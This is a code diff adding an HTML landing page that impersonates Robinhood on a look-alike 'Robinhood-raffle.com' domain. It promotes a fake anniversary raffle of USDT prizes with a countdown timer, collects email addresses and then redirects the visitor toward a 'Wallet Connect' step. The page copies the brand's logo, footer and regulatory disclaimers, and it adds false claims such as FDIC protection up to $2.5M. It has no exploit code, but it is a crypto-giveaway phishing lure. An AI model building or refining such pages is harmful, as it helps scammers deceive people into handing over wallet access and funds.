@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Raffle | Robinhood-raffle.com</title>
+    <!-- Load Tailwind CSS --><script src="https://cdn.tailwindcss.com"></script>
+    <!-- Load Three.js library --><script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <!-- Load Font Awesome for Icons --><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" xintegrity="sha512-SnH5WK+bZxgPHs44uWIX+LLMDJ8uR027hR6PzT99UvjG1eJbS+T1k5F9y+9qG/wB/g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <!-- Load Custom Fonts --><link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap" rel="stylesheet">
+    <style>
+        /* Ensuring Inter is used and setting the NEW PURE BLACK BACKGROUND color */
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: '#000000'; /* PURE BLACK */
+            color: '#F7F7F7'; /* Primary Text Color */
+        }
+        /* New class for the headline font */
+        .font-playfair {
+            font-family: 'Playfair Display', serif;
+        }
+
+        /* Custom class to simulate SF Pro, prioritizing native system fonts */
+        .font-sf-pro {
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Inter", sans-serif;
+        }
+
+        /* Set the background image on the main content container */
+        #main-content-block {
+            /* Using the new external trading chart image */
+            background-image: url('http://googleusercontent.com/image_collection/image_retrieval/3316820901475820891'); 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            /* Ensure text sits on top of the image */
+            position: relative; 
+            overflow: hidden; /* Contains the overlay */
+            min-height: calc(100vh - 4rem); /* Ensure it takes up available height minus header */
+        }
+        
+        /* Overlay for readability */
+        #main-content-block::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            /* Deep dark overlay (now PURE BLACK) to ensure text contrast */
+            background-color: rgba(0, 0, 0, 0.85); /* Pure black with 85% opacity */
+            z-index: 1; /* Place overlay below text content */
+        }
+        
+        /* Ensure the text content is on top of the overlay */
+        #desktop-layout-wrapper {
+            position: relative;
+            z-index: 2; /* Place content above the overlay */
+        }
+        /* Ensure the canvas fills its container */
+        #animation-container canvas {
+            display: block;
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+    <script>
+        // Define the exact color palette for Tailwind
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'robinhood-green': '#CCFF00', // Accent Color (Neon Green)
+                        'rh-dark': '#000000', /* Main Content Background (PURE BLACK) */
+                        'rh-text': '#F7F7F7', /* Primary Text Color (Light Gray) */
+                        'rh-header': '#000000', /* Element Text/Background (PURE BLACK) */
+                        'rh-surface': '#252525', /* Input/Card Background (Dark Gray) - KEPT FOR CONTRAST */
+                        'rh-light-gray': '#4A4A4A', /* Input Border/Surface Accent (Medium Gray) */
+                    },
+                }
+            }
+        }
+    </script>
+</head>
+<body>
+
+    <!-- MAIN CONTAINER: Centered and full-height --><div class="min-h-screen flex flex-col items-center justify-start bg-rh-dark relative z-10">
+
+        <!-- GREEN HEADER BAR (MATCHING IMAGE) --><div class="w-full bg-robinhood-green px-4 py-3 flex justify-between items-center h-16 shadow-xl z-20">
+            <!-- Logo and Robinhood Text (Black on Neon Green) --><div class="flex items-center space-x-2">
+                <!-- Robinhood Feather Icon (Inline SVG for precise styling) --><svg class="h-6 w-6 text-rh-header" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12.5 2C12.5 2 12 3.5 10.5 5C9 6.5 7.5 7 7.5 7C7.5 7 6 7.5 6 9C6 10.5 7 11.5 8 11.5C9 11.5 10 10 10 9L13.5 15.5L12 17C12 17 11.5 19 13.5 20.5C15.5 22 18 22 18 22L20 20.5C20 20.5 20.5 18.5 18.5 17C16.5 15.5 14 15.5 14 15.5L16 12C16 12 17.5 11 18 10C18.5 9 17.5 7.5 17 7C16.5 6.5 15 7 15 7L12.5 2Z"/>
+                </svg>
+                <!-- Ensuring the text style matches the image --><span class="text-rh-header font-playfair font-semibold text-xl">Robinhood</span>
+            </div>
+
+            <!-- Right Side: Log In Button and Menu Icon --><div class="flex items-center space-x-2">
+                <!-- Large, pill-shaped 'Log in' button --><a 
+                    href="https://robinhood.com/login" 
+                    target="_blank" 
+                    class="h-10 px-6 flex items-center bg-rh-header text-robinhood-green rounded-full font-bold text-base shadow-lg transition hover:bg-gray-900"
+                >
+                    Log in
+                </a>
+                <!-- Custom two-line menu icon to closely match the image --><button class="text-rh-header text-2xl font-extrabold p-1 leading-none flex flex-col justify-center items-center">
+                    <span class="block h-0.5 w-6 bg-rh-header mb-1"></span>
+                    <span class="block h-0.5 w-6 bg-rh-header"></span>
+                </button>
+            </div>
+        </div>
+
+        <!-- MAIN CONTENT BLOCK: Contains two columns on desktop, one column on mobile -->
+        <div 
+            id="main-content-block" 
+            class="flex flex-col items-center justify-center flex-grow w-full p-8"
+        >
+            <!-- NEW: Wrapper for centered content and side-by-side animation on desktop (lg) -->
+            <!-- Using lg:items-start so the content blocks and animation align at the top -->
+            <div id="desktop-layout-wrapper" class="flex flex-col lg:flex-row lg:items-start lg:justify-center lg:space-x-8 w-full max-w-7xl h-full">
+
+                <!-- LEFT BLOCK: Text, Form, Countdown, and Marketing Card -->
+                <div id="content-block" class="max-w-md mx-auto lg:mx-0 lg:py-8">
+                    
+                    <!-- H1 TEXT (Marketing Copy) --><h1 class="text-3xl sm:text-4xl font-bold leading-tight mb-6 text-rh-text font-playfair">
+                        Celebrating 7 Years: We're Giving Back to Our Community.
+                    </h1>
+                    
+                    <!-- P TEXT (Subtitle) --><p class="text-lg text-gray-300 mb-6">
+                        To celebrate our 7th anniversary, we are hosting an exclusive raffle for our customers.
+                    </p>
+
+                    <!-- Raffle Announcement with Info Icon --><p class="text-sm text-gray-400 mb-10 flex items-start justify-start">
+                        <i class="fa-solid fa-circle-info text-gray-400 text-sm mr-2 shrink-0"></i>
+                        <span class="text-rh-text font-normal text-sm">
+                            100,000 users will be selected at random for cash prizes between 100 - 1000 USDT. Don't miss out!
+                        </span>
+                    </p>
+
+                    <!-- INTERACTIVE AREA: Buttons, Form, and Status -->
+                    <div id="interactive-area" class="w-full">
+                        <!-- STEP 1: INITIAL BUTTON TO SHOW THE FORM -->
+                        <div id="initialButtonContainer" class="mt-4 flex flex-col items-start lg:items-start space-y-4">
+                            <button
+                                id="showEmailFormButton"
+                                class="w-48 px-4 py-3 bg-robinhood-green text-rh-header font-extrabold text-base rounded-full shadow-md hover:brightness-110 transition duration-300 transform hover:scale-[1.02] font-sf-pro"
+                            >
+                                Enter Raffle
+                            </button>
+                            <!-- Simple status message displayed below the button --><p id="messageBox" class="text-xs text-gray-400 pt-3 h-6 text-left"></p>
+                        </div>
+                        
+                        <!-- STEP 2: EMAIL FORM CONTAINER (Initially Hidden) -->
+                        <div id="emailFormContainer" class="hidden mt-4 flex flex-col items-start lg:items-start space-y-4">
+                            <form id="emailForm" class="flex flex-col items-start space-y-4 w-full">
+                                <input 
+                                    type="email" 
+                                    id="emailInput" 
+                                    placeholder="Email address"
+                                    required
+                                    class="w-48 p-3 bg-rh-dark border border-rh-text rounded-lg text-rh-text focus:ring-2 focus:ring-robinhood-green focus:border-robinhood-green transition"
+                                >
+                                <!-- SUBMIT BUTTON: "Enter Raffle" (Used inside the form) --><button 
+                                    type="submit"
+                                    id="submitEmailButton"
+                                    class="w-48 px-4 py-3 bg-robinhood-green text-rh-header font-extrabold text-base rounded-full shadow-md hover:brightness-110 transition duration-300 transform hover:scale-[1.02] font-sf-pro"
+                                >
+                                    Enter Raffle
+                                </button>
+                            </form>
+                        </div>
+                        <!-- END EMAIL FORM CONTAINER -->
+                    </div>
+                    
+                    <!-- COUNTDOWN TIMER (Adjusted to left-align on desktop) --><div id="countdown" class="mt-8 w-full mx-auto lg:mx-0">
+                        <p class="text-xs font-medium uppercase mb-3 text-gray-400 tracking-wider text-left">Offer ends in</p>
+                        <div id="timerDisplay" class="flex justify-start space-x-2 text-left">
+                            <!-- Units inserted by JS --></div>
+                    </div>
+                    
+                    <!-- EARN INTEREST MARKETING BLOCK (NEW POSITION: Right below countdown, aligned left) -->
+                    <div id="earn-interest-block" class="mt-8 w-full p-6 bg-robinhood-green text-rh-header rounded-xl shadow-2xl transition hover:shadow-robinhood-green/50 max-w-md">
+                        <!-- Title/Header -->
+                        <h3 class="text-lg font-bold mb-1">Earn</h3>
+                        <h2 class="text-3xl font-extrabold mb-4 font-playfair leading-tight">
+                            Get 3.5% interest on your cash
+                        </h2>
+                        <!-- Body Text -->
+                        <p class="text-sm mb-4">
+                            Earn 3.5% AER on the uninvested cash in your account. We pay interest on every dollar—and your cash is safely protected by FDIC deposit insurance for up to $2.5M. Interest rate subject to change.
+                        </p>
+                        <!-- Info Link -->
+                        <p class="text-xs mb-6 flex items-center">
+                            <i class="fa-solid fa-circle-info text-xs mr-2 shrink-0"></i>
+                            <a href="#" class="font-bold hover:underline">Learn more about protections</a>
+                        </p>
+                        <!-- Action Button (Reduced width to w-40, which is 160px) -->
+                        <button
+                            class="w-40 mx-auto block px-6 py-3 bg-rh-header text-robinhood-green font-bold text-base rounded-full shadow-lg hover:opacity-90 transition duration-300 font-sf-pro"
+                        >
+                            Start earning 3.5% AER
+                        </button>
+                        <!-- Large 3.5% AER text (Simulating the style from the bottom of the image) -->
+                        <div class="mt-8 text-center">
+                            <span class="text-7xl font-playfair font-black tracking-tighter leading-none block">3.5<span class="text-5xl font-extrabold align-top"> %</span></span>
+                            <span class="text-xl font-bold uppercase tracking-widest block mt-1">AER</span>
+                        </div>
+                    </div>
+                    <!-- END EARN INTEREST MARKETING BLOCK -->
+                </div>
+                <!-- END content-block -->
+
+                <!-- RIGHT BLOCK: 3D Animation (Desktop Only) -->
+                <!-- The container is now fixed to 300x400 and removed flex-1, positioning it right next to the content. -->
+                <div id="animation-container" class="lg:w-[300px] lg:h-[400px] hidden lg:block mt-8 lg:mt-0 relative">
+                    <!-- Canvas will be appended here -->
+                </div>
+                
+            </div>
+            <!-- END desktop-layout-wrapper -->
+
+        </div>
+        
+    </div>
+    <!-- END MAIN CONTAINER --><!-- FOOTER CONTENT --><footer class="bg-rh-header pt-10 pb-16 px-6 text-rh-text">
+        <div class="max-w-7xl mx-auto">
+            
+            <!-- TOP LINKS & FOLLOW US --><div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-y-8 gap-x-6 mb-10">
+                
+                <!-- Column 1: CRS, BrokerCheck, Follow Us --><div class="col-span-full sm:col-span-1 space-y-2 text-sm">
+                    <a href="#" class="hover:underline block text-gray-400">Customer Relationship Summaries</a>
+                    <a href="#" class="hover:underline block text-gray-400">FINRA’s BrokerCheck</a>
+                    <p class="font-bold mt-4">Follow us on</p>
+                    <div class="flex space-x-4 text-xl">
+                        <!-- Social Icons with links --><a href="https://www.facebook.com/Robinhood" target="_blank" aria-label="Facebook">
+                            <i class="fa-brands fa-facebook-f text-gray-400 hover:text-robinhood-green transition"></i>
+                        </a>
+                        <a href="https://twitter.com/RobinhoodApp" target="_blank" aria-label="Twitter (X)">
+                            <i class="fa-brands fa-x-twitter text-gray-400 hover:text-robinhood-green transition"></i>
+                        </a>
+                        <a href="https://www.instagram.com/robinhoodapp/" target="_blank" aria-label="Instagram">
+                            <i class="fa-brands fa-instagram text-gray-400 hover:text-robinhood-green transition"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <!-- Column 2: Product, Social, Learn --><div>
+                    <h4 class="font-bold mb-3">Product</h4>
+                    <ul class="space-y-2 text-sm text-gray-400">
+                        <li><a href="#" class="hover:underline">Invest</a></li>
+                        <li><a href="#" class="hover:underline">Strategies</a></li>
+                        <li><a href="#" class="hover:underline">Trading</a></li>
+                        <li><a href="#" class="hover:underline">Retirement</a></li>
+                        <li><a href="#" class="hover:underline">Gold</a></li>
+                        <li><a href="#" class="hover:underline">Crypto</a></li>
+                        <li><a href="#" class="hover:underline">Legend</a></li>
+                        <li><a href="#" class="hover:underline">Options</a></li>
+                        <li><a href="#" class="hover:underline">Futures</a></li>
+                        <li><a href="#" class="hover:underline">Banking</a></li>
+                        <li><a href="#" class="hover:underline">Credit Card</a></li>
+                        <!-- Social/Ventures/Learn items grouped for layout --><h4 class="font-bold mt-4 pt-2 border-t border-gray-700/50">Social & Learn</h4>
+                        <li><a href="#" class="hover:underline">Social</a></li>
+                        <li><a href="#" class="hover:underline">Ventures</a></li>
+                        <li><a href="#" class="hover:underline">Learn</a></li>
+                        <li><a href="#" class="hover:underline">Snacks</a></li>
+                    </ul>
+                </div>
+                
+                <!-- Column 3: Company --><div>
+                    <h4 class="font-bold mb-3">Company</h4>
+                    <ul class="space-y-2 text-sm text-gray-400">
+                        <li><a href="#" class="hover:underline">About us</a></li>
+                        <li><a href="#" class="hover:underline">Blog</a></li>
+                        <li><a href="#" class="hover:underline">Partner With Us</a></li>
+                        <li><a href="#" class="hover:underline">Affiliates</a></li>
+                        <li><a href="#" class="hover:underline">Press</a></li>
+                        <li><a href="#" class="hover:underline">Careers</a></li>
+                        <li><a href="#" class="hover:underline">Commitments</a></li>
+                        <li><a href="#" class="hover:underline">Investor Relations</a></li>
+                        <li><a href="#" class="hover:underline">Support</a></li>
+                        <li><a href="#" class="hover:underline">ESG</a></li>
+                        <li><a href="#" class="hover:underline">Investor Index</a></li>
+                        <li><a href="#" class="hover:underline">Robinhood Merch</a></li>
+                    </ul>
+                </div>
+                
+                <!-- Column 4: Legal & Regulatory --><div>
+                    <h4 class="font-bold mb-3">Legal & Regulatory</h4>
+                    <ul class="space-y-2 text-sm text-gray-400">
+                        <li><a href="#" class="hover:underline">Terms & Conditions</a></li>
+                        <li><a href="#" class="hover:underline">Disclosures</a></li>
+                        <li><a href="#" class="hover:underline">Robinhood Financial Entities US Online Privacy Statement</a></li>
+                        <li><a href="#" class="hover:underline">Robinhood Markets US Online Privacy Statement</a></li>
+                        <li><a href="#" class="hover:underline">Law Enforcement Requests</a></li>
+                        <li><a href="#" class="hover:underline">Your Privacy Choices</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- DISCLAIMER SECTION --><div class="pt-6 border-t border-gray-700/50 text-xs text-gray-500 space-y-4">
+                <p class="font-bold text-gray-400">All investing involves risk.</p>
+                <p>
+                    Brokerage services are offered through Robinhood Financial LLC, (“RHF”) a registered broker dealer (member <a href="#" class="font-bold hover:underline">SIPC</a>), and clearing services through Robinhood Securities, LLC, (“RHS”) a registered broker dealer (member <a href="#" class="font-bold hover:underline">SIPC</a>), and clearing services through Robinhood Securities, LLC, (“RHS”) a registered broker dealer (member <a href="#" class="font-bold hover:underline">SIPC</a>). While there is no additional cost to use Robinhood Legend, there are other fees associated with your brokerage account. Review the <a href="#" class="font-bold hover:underline">fee schedule</a> for more information.
+                </p>
+                <p>
+                    Portfolio Management offered through Robinhood Asset Management, LLC (“Robinhood Strategies” or “RAM”), an SEC-registered investment advisor. For additional information about Robinhood Strategies, including about services, fees, risks, and conflicts of interest, please see our <a href="#" class="font-bold hover:underline">firm’s brochure</a>.
+                </p>
+                <p>
+                    Futures and cleared swaps trading is offered by Robinhood Derivatives, LLC, (“RHD”) a registered futures commission merchant with the Commodity Futures Trading Commission (CFTC) and a Member of the National Futures Association (NFA). RHD is not FDIC insured or SIPC protected.
+                </p>
+                <p>
+                    Cryptocurrency services are offered through an account with Robinhood Crypto, LLC (“RHC”) (NMLS ID: 1702840). Robinhood Crypto is licensed to engage in virtual currency business activity by the New York State Department of Financial Services. Review a list of <a href="#" class="font-bold hover:underline">RHC's licenses</a> for more information. Cryptocurrency held through Robinhood Crypto is not FDIC insured or SIPC protected.
+                </p>
+                <p>
+                    The Robinhood spending account is offered through Robinhood Money, LLC (“RHY”) (NMLS ID: 1990968), a licensed money transmitter. Review a <a href="#" class="font-bold hover:underline">list of our licenses</a> for more information.
+                </p>
+                <p>
+                    The Robinhood Cash Card is a prepaid card issued by Sutton Bank, Member FDIC, pursuant to a license from Mastercard® International Incorporated. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated.
+                </p>
+                <p>
+                    Robinhood Gold Card is subject to credit approval and underwriting. Robinhood Gold Card is offered by Robinhood Credit, Inc. (“RCT”), and is issued by Coastal Community Bank, pursuant to a license from Visa U.S.A. Inc. RCT is a financial technology company, not a bank.
+                </p>
+                <p>
+                    Robinhood Gold is a subscription-based membership program of premium services offered through Robinhood Gold, LLC (“RHG”).
+                </p>
+                <p>
+                    RHF, RHS, RAM, RHD, RHC, RHY, RCT, and RHG are affiliated entities and wholly owned subsidiaries of Robinhood Markets, Inc. RHF, RHS, RAM, RHD, RHC, RHY, RCT, and RHG are not banks. Investing products offered by RHF are not FDIC insured and involve risk, including possible loss of principal.
+                </p>
+                <p>
+                    RHY is not a member of FINRA, and products are not subject to SIPC protection, but funds held in the Robinhood spending account and Robinhood Cash Card account may be eligible for FDIC pass-through insurance (review the <a href="#" class="font-bold hover:underline">Robinhood Cash Card Agreement</a> and the <a href="#" class="font-bold hover:underline">Robinhood Spending Account Agreement</a>).
+                </p>
+                <p>
+                    Funds held in your Robinhood Cash Card account at Sutton Bank are eligible for FDIC insurance up to $250,000 and will not accrue or pay any interest. The availability of FDIC insurance is contingent upon Robinhood maintaining records acceptable to the FDIC, as receiver, if Sutton Bank should fail. FDIC insurance limits apply collectively to all of your deposits held at Sutton Bank.
+                </p>
+                <p>
+                    Options trading entails significant risk and is not appropriate for all customers. Customers must read and understand the <a href="#" class="font-bold hover:underline">Characteristics and Risks of Standardized Options</a> before engaging in any options trading strategies. Options transactions are often complex and may involve the potential of losing the entire investment in a relatively short period of time. Certain complex options strategies carry additional risk, including the potential for losses that may exceed the original investment amount.
+                </p>
+                <p>4784959</p>
+                <p>
+                    Robinhood, 85 Willow Road, Menlo Park, CA 94025. &copy; 2025 Robinhood. All rights reserved
+                </p>
+            </div>
+        </div>
+    </footer>
+    <!-- FOOTER CONTENT END --><script>
+        
+        // DOM Elements
+        const messageBox = document.getElementById('messageBox');
+        const showEmailFormButton = document.getElementById('showEmailFormButton');
+        const initialButtonContainer = document.getElementById('initialButtonContainer');
+        const emailFormContainer = document.getElementById('emailFormContainer');
+        const emailForm = document.getElementById('emailForm');
+        const emailInput = document.getElementById('emailInput');
+        const submitEmailButton = document.getElementById('submitEmailButton');
+        const countdownElement = document.getElementById('timerDisplay');
+        const countdownContainer = document.getElementById('countdown');
+        
+        // Initial button text
+        const initialButtonText = 'Enter Raffle'; 
+
+        // --- Core Logic: Handle Email Submission ---
+        if (emailForm) {
+            emailForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                const email = emailInput.value.trim();
+
+                // Simple client-side validation
+                if (!email || !email.includes('@') || !email.includes('.')) {
+                    messageBox.textContent = 'Please enter a valid email address.';
+                    messageBox.classList.remove('text-robinhood-green');
+                    messageBox.classList.add('text-red-400');
+                    return;
+                }
+
+                // 1. Simulate the Registration State
+                submitEmailButton.disabled = true;
+                submitEmailButton.textContent = 'Registering...';
+                
+                messageBox.textContent = 'Securing your entry and preparing redirect...';
+                messageBox.classList.remove('text-red-400');
+                messageBox.classList.add('text-robinhood-green');
+
+                // 2. Simulate Delay (e.g., API call to save email)
+                setTimeout(() => {
+                    // 3. Finalized State - Update Button and Redirect
+                    
+                    // Main button updates to reflect the successful entry state
+                    if (submitEmailButton) {
+                        submitEmailButton.textContent = initialButtonText; 
+                        submitEmailButton.disabled = false;
+                    }
+
+                    // Update final message on main page
+                    if (messageBox) {
+                        messageBox.innerHTML = `✅ Email registered! Proceeding to **Wallet Connect**...`;
+                    }
+
+                    // Start the redirection countdown after a brief moment 
+                    setTimeout(() => {
+                        // Redirect to the simulated wallet connection page
+                        window.location.href = 'https://robinhood.com/crypto/connect-exchange-wallet'; 
+                    }, 800); // Wait 0.8s before final redirect
+
+                }, 2500); // 2.5 second delay for registration
+            });
+        }
+        
+        // --- Logic to Show Email Form ---
+        if (showEmailFormButton) {
+            showEmailFormButton.addEventListener('click', function() {
+                // Hide the initial button
+                if (initialButtonContainer) {
+                    initialButtonContainer.classList.add('hidden');
+                }
+                
+                // Show the email input form
+                if (emailFormContainer) {
+                    emailFormContainer.classList.remove('hidden');
+                }
+                
+                // Clear any previous message in the box
+                if (messageBox) {
+                    messageBox.textContent = '';
+                }
+            });
+        }
+
+        // --- Countdown Timer Logic (7 Days) ---
+        // Calculate the end date: 7 days from now
+        const targetDate = new Date();
+        targetDate.setDate(targetDate.getDate() + 7);
+        
+        // Helper function to format the time unit display
+        function formatTimeUnit(value, unit) {
+            return `
+                <div class="flex flex-col w-1/4 max-w-[80px]">
+                    <!-- Numbers are now text-xl on mobile and text-2xl on larger screens --><span class="text-xl sm:text-2xl font-extrabold text-robinhood-green leading-none">${String(value).padStart(2, '0')}</span>
+                    <span class="text-xs uppercase text-gray-400 font-medium mt-1">${unit}</span>
+                </div>
+            `;
+        }
+
+        function updateCountdown() {
+            const now = new Date().getTime();
+            const distance = targetDate.getTime() - now;
+
+            if (distance < 0) {
+                // Timer expired
+                clearInterval(countdownInterval);
+                if (countdownContainer) {
+                    countdownContainer.innerHTML = '<p class="text-left text-lg font-bold text-robinhood-green">RAFFLE HAS ENDED!</p>';
+                }
+                return;
+            }
+
+            // Time calculations for days, hours, minutes and seconds
+            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+            // Update the display
+            if (countdownElement) {
+                countdownElement.innerHTML = 
+                    formatTimeUnit(days, 'Days') +
+                    formatTimeUnit(hours, 'Hours') +
+                    formatTimeUnit(minutes, 'Mins') +
+                    formatTimeUnit(seconds, 'Secs');
+            }
+        }
+
+        // Run the function once immediately and then every second
+        updateCountdown();
+        const countdownInterval = setInterval(updateCountdown, 1000);
+        
+        // --- 3D Coin Animation Logic (Three.js) ---
+
+        // Check if we are on a desktop size (lg: breakpoint or larger)
+        if (window.innerWidth >= 1024) { 
+            
+            const container = document.getElementById('animation-container');
+            // Constants adjusted for a small, gentle rain localized effect
+            const FALL_RESET_Y = 15; 
+            const FALL_OUT_Y = -15; 
+            const SPREAD_RANGE_XY = 10; // Reduced spread
+            const SPREAD_RANGE_Z = 5; // Reduced depth spread
+
+            if (container) {
+                let scene, camera, renderer, coins = [];
+                
+                // Initialize the scene
+                function init() {
+                    // Dynamic sizing based on container's fixed Tailwind size (300x400)
+                    const dynamicWidth = container.clientWidth;
+                    const dynamicHeight = container.clientHeight;
+
+                    // Scene setup
+                    scene = new THREE.Scene();
+
+                    // Camera setup: Perspective Camera (FOV, Aspect, Near, Far)
+                    camera = new THREE.PerspectiveCamera(75, dynamicWidth / dynamicHeight, 0.1, 1000);
+                    camera.position.z = 7; // Moved camera closer to the localized rain
+
+                    // Renderer setup
+                    renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true }); 
+                    renderer.setSize(dynamicWidth, dynamicHeight); 
+                    container.appendChild(renderer.domElement);
+                    
+                    // Lighting
+                    const ambientLight = new THREE.AmbientLight(0xffffff, 0.5);
+                    scene.add(ambientLight);
+
+                    // Directional light 1 (Robinhood Green tint)
+                    const directionalLight = new THREE.DirectionalLight(0xccff00, 1.5); 
+                    directionalLight.position.set(5, 10, 7.5);
+                    directionalLight.castShadow = true;
+                    scene.add(directionalLight);
+
+                    // Directional light 2 (White highlight)
+                    const directionalLight2 = new THREE.DirectionalLight(0xffffff, 0.8);
+                    directionalLight2.position.set(-5, -10, -7.5);
+                    scene.add(directionalLight2);
+                    
+                    // Create Coins
+                    const coinCount = 40; // Reduced count for "gentle rain"
+                    
+                    for (let i = 0; i < coinCount; i++) {
+                        const radius = THREE.MathUtils.randFloat(0.5, 1.0); 
+                        const height = THREE.MathUtils.randFloat(0.1, 0.2);
+                        const geometry = new THREE.CylinderGeometry(radius, radius, height, 16); 
+                        
+                        // Metallic material for a coin look
+                        const material = new THREE.MeshStandardMaterial({ 
+                            color: 0xffcc00, 
+                            metalness: THREE.MathUtils.randFloat(0.8, 1.0),
+                            roughness: THREE.MathUtils.randFloat(0.1, 0.4),
+                            emissive: 0xccff00, 
+                            emissiveIntensity: 0.1
+                        });
+
+                        const coin = new THREE.Mesh(geometry, material);
+                        
+                        // Positioning to start high and spread out
+                        coin.position.x = THREE.MathUtils.randFloatSpread(SPREAD_RANGE_XY);
+                        coin.position.y = THREE.MathUtils.randFloat(FALL_RESET_Y, FALL_RESET_Y + 20); 
+                        coin.position.z = THREE.MathUtils.randFloatSpread(SPREAD_RANGE_Z); 
+                        
+                        // Random initial rotation
+                        coin.rotation.x = Math.random() * Math.PI;
+                        coin.rotation.y = Math.random() * Math.PI;
+                        coin.rotation.z = Math.random() * Math.PI;
+
+                        // Store rotation and fall speeds
+                        coin.userData.rotationSpeed = { 
+                            x: THREE.MathUtils.randFloat(0.01, 0.05),
+                            y: THREE.MathUtils.randFloat(0.01, 0.05),
+                            z: THREE.MathUtils.randFloat(0.01, 0.05),
+                        };
+                        
+                        // Fall speed
+                        coin.userData.fallSpeed = THREE.MathUtils.randFloat(0.08, 0.18); 
+
+                        coins.push(coin);
+                        scene.add(coin);
+                    }
+                }
+
+                // Handle resizing of the canvas
+                function onWindowResize() {
+                    if (renderer && container) {
+                        // Read the new size of the fixed container
+                        const width = container.clientWidth;
+                        const height = container.clientHeight;
+                        
+                        camera.aspect = width / height;
+                        camera.updateProjectionMatrix();
+                        renderer.setSize(width, height);
+                    }
+                }
+
+                // Animation Loop (Game Loop)
+                function animate() {
+                    requestAnimationFrame(animate);
+
+                    // Falling and Rotation Logic
+                    coins.forEach(coin => {
+                        // 1. Apply constant rotation
+                        coin.rotation.x += coin.userData.rotationSpeed.x;
+                        coin.rotation.y += coin.userData.rotationSpeed.y;
+                        coin.rotation.z += coin.userData.rotationSpeed.z;
+                        
+                        // 2. Apply falling movement (decrease Y position)
+                        coin.position.y -= coin.userData.fallSpeed; 
+
+                        // 3. Reset coin position when it falls out of view
+                        if (coin.position.y < FALL_OUT_Y) {
+                            coin.position.y = FALL_RESET_Y; // Reset high up
+                            // Randomize horizontal position across the small spread
+                            coin.position.x = THREE.MathUtils.randFloatSpread(SPREAD_RANGE_XY); 
+                            coin.position.z = THREE.MathUtils.randFloatSpread(SPREAD_RANGE_Z);
+                        }
+                    });
+
+                    renderer.render(scene, camera);
+                }
+
+                // Start the 3D scene once the window has fully loaded
+                window.addEventListener('load', function() {
+                    if (window.innerWidth >= 1024) {
+                        init();
+                        animate();
+                        // Add resize listener only if initialized (in case the browser window is resized)
+                        window.addEventListener('resize', onWindowResize);
+                    }
+                });
+            }
+        }
+
+    </script>
+
+</body>
+</html>
